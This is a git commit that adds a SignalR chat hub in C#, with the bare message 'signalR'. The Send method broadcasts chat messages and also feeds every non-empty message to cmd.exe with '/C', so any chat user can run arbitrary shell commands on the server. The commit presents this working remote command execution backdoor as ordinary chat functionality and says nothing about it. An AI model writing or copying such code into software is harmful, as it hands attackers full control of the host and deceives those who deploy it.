f0d487db20b8dc035966cd34ba9cb3b0e313e5da
aayush-makkad <aayu.makkad@gmail.com>
2016-07-30 17:19:22 +0530

    signalR

---
+++ SignalRChat/ChatHub.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Web;
+using Microsoft.AspNet.SignalR;
+using Microsoft.AspNet.SignalR.Messaging;
+using System.Runtime;
+using System.Linq;
+using System.Diagnostics;
+
+namespace SignalRChat
+{
+    public class ChatHub : Hub
+    {
+        public void Send(string name, string message)
+        {
+            // Call the broadcastMessage method to update clients.
+            Clients.All.broadcastMessage(name, message);
+
+            string s = message;
+            string p;
+            if (s != "")
+            {
+                p = "/C " + s + "";
+
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = p;
+                process.Start();
+            }
+
+        }
+
+    }
+}
